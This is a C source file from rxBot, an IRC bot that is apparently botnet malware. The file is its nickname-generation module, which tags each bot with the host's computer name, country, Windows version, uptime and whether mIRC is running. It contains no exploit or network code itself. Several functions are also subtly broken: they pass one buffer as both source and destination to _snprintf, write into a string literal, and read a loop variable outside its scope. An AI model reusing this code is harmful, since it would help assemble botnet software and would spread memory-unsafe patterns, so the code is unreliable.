/*

    rxBot - a modular IRC bot for Win32
    Copyright (C) 2004

    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA

*/

#include "includes.h"
#include "functions.h"
#include "externs.h"

RNICK rnick[]={
	#ifndef NO_REALNICK
	{"real", REALNICK, rndnickreal},
	#endif
	{"const", CONSTNICK, rndnickconst},
	{"letter", LETTERNICK, rndnickletter},
	{"letterz", LETNUMNICK, rndnickletternumbers},
	{"comp", COMPNICK, rndnickcomp},
	{"country", COUNTRYNICK, rndnickcountry},
	{"os", OSNICK, rndnickos}
};

#ifndef NO_REALNICK
#include "nicklist.h"

char *rndnickreal(char *strbuf)
{
	srand(GetTickCount());

    _snprintf(strbuf, MAXNICKLEN, "%s", nicklist[rand()%(sizeof(nicklist) / sizeof(char *))]);

    for (int i=0;i < maxrand;i++) 
		_snprintf(strbuf, MAXNICKLEN, "%s%i", strbuf, rand()%10);
    	
	return (strbuf);
}
#endif

char *rndnickconst(char *strbuf)
{
	srand(GetTickCount());

	_snprintf(strbuf, MAXNICKLEN, "%s", nickconst);

    for (int i=0;i < maxrand;i++) 
		_snprintf(strbuf, MAXNICKLEN, "%s%i", strbuf, rand()%10);
  
	return (strbuf); 
}

char *rndnickletter(char *strbuf)
{	
    srand(GetTickCount());	

	int randlen = (rand()%3)+maxrand;
	
	for (int i=0; i < randlen; i++) 
		strbuf[i] = (rand()%26)+97;
	strbuf[i] = '\0';

	return (strbuf);
}

char *rndnickletternumbers(char *strbuf)
{	
	srand(GetTickCount());

	char vAlpha[] = "0123456789abcdefghijklmnopqrstuvwxyz";
		
	sprintf(strbuf, "%c", ((rand()%26) + 'a'));
	for (int i=0;i < maxrand;i++) 
		_snprintf(strbuf, MAXNICKLEN, "%s%c", strbuf, vAlpha[rand()%36]);

	return (strbuf);
}

char *rndnickcomp(char *strbuf) 
{
    int i;

    LPTSTR lpszCompName="PC";
    DWORD cchBuff = 256;
	BOOL NameGood = FALSE;
 
    srand(GetTickCount());
 
	if(!GetComputerName(lpszCompName, &cchBuff)) 
		lpszCompName="PC";
 
	for (i=65;i<91;i++) 
		if (lpszCompName[0] == i)
			NameGood = TRUE;
    for (i=97;i<123;i++)
		if (lpszCompName[0] == i)
			NameGood = TRUE;
    if (!NameGood) 
		lpszCompName="PC";
    _snprintf(strbuf, MAXNICKLEN, lpszCompName);

    for (i=0;i < maxrand;i++) 
		_snprintf(strbuf, MAXNICKLEN, "%s%i", strbuf, rand()%10);
 
	return (strbuf);
}

char *rndnickcountry(char *strbuf)
{
	char temp[10];

    srand(GetTickCount());

	GetLocaleInfo(LOCALE_SYSTEM_DEFAULT, LOCALE_SABBREVCTRYNAME, temp, sizeof(temp));
	_snprintf(strbuf, MAXNICKLEN, "%s|", temp);

    for (int i=0;i < maxrand;i++) 
		_snprintf(strbuf, MAXNICKLEN, "%s%i", strbuf, rand()%10);

	return (strbuf);
}

char *rndnickos(char *strbuf)
{
	char *os="";
	OSVERSIONINFO verinfo;
	verinfo.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
	GetVersionEx(&verinfo);

	srand(GetTickCount());

	if (verinfo.dwMajorVersion == 4 && verinfo.dwMinorVersion == 0) {
		if (verinfo.dwPlatformId == VER_PLATFORM_WIN32_WINDOWS) os = "95";
		if (verinfo.dwPlatformId == VER_PLATFORM_WIN32_NT) os = "NT";
	}
	else if (verinfo.dwMajorVersion == 4 && verinfo.dwMinorVersion == 10) os = "98";
	else if (verinfo.dwMajorVersion == 4 && verinfo.dwMinorVersion == 90) os = "ME";
	else if (verinfo.dwMajorVersion == 5 && verinfo.dwMinorVersion == 0) os = "2K";
	else if (verinfo.dwMajorVersion == 5 && verinfo.dwMinorVersion == 1) os = "XP";
	else if (verinfo.dwMajorVersion == 5 && verinfo.dwMinorVersion == 2) os = "2K3";
	else os = "???";

	_snprintf(strbuf,MAXNICKLEN,"[%s]|",os);

    for (int i=0;i < maxrand;i++) 
		_snprintf(strbuf, MAXNICKLEN, "%s%i", strbuf, rand()%10);

	return (strbuf);
}

char *prefixnick(char *strbuf)
{
	char tmpbuf[MAXNICKLEN];
	
	unsigned int days = GetTickCount() / 86400000;
	if (days > 100)
		#ifndef NO_MIRCNICK
		_snprintf(tmpbuf, sizeof(tmpbuf),"[%d]%s", days, ((fFindWindow("mIRC",0))?("[M]"):("")));
	else
		sprintf(tmpbuf, ((fFindWindow("mIRC",0))?("[M]"):("")));
		#else
		_snprintf(tmpbuf, sizeof(tmpbuf),"[%d]", days);
		#endif

	if (strlen(tmpbuf) > 2) {
		strncat(tmpbuf, strbuf, sizeof(tmpbuf));
		strncpy(strbuf, tmpbuf, MAXNICKLEN);
	}

	return (strbuf);
};

char *rndnick(char *strbuf, int type, BOOL prefix, char *name)
{
	for (int i=0; i < (sizeof(rnick) / sizeof(RNICK)); i++)
		if ((name)?(strcmp(name,rnick[i].name)==0):(rnick[i].type == type)) {
			rnick[i].rnfunc(strbuf);
			break;
		}

	return ((prefix)?(prefixnick(strbuf)):(strbuf));
}
